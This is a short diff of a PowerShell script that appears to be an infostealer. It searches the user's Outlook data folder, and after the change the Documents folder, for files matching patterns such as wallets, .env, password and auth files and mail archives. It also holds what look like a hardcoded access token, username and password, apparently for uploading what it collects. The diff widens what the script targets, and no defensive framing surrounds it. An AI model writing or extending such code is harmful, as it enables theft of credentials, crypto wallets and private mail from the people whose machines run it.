@@ -1,5 +1,6 @@
 $s = $env:USERPROFILE + "\AppData\Local\Microsoft\Outlook\*"
-$fileTypes = "*.txt", "*wallet*", "*.env", "*.x*", "*.doc*", "*pass*", "*auth*", "*.pst", "*.ost"
+$s=$env:USERPROFILE+"\Documents\*";
+$fileTypes = "*.txt", "*wallet*", "*.env", "*.x*", "*.doc*", "*pass*", "*auth*", "*.pst", "*.ost", "*.srs"
 $r="B1oiS5_ksmIAAAAAAAAAAThmk-sKjvpgKZDGaSObRSk9KNC3XQKbUt35MTkqdy3f";
 $u = '60soiqecjsvvvzg';
 $p = 'sk0n5x76b52ttht';
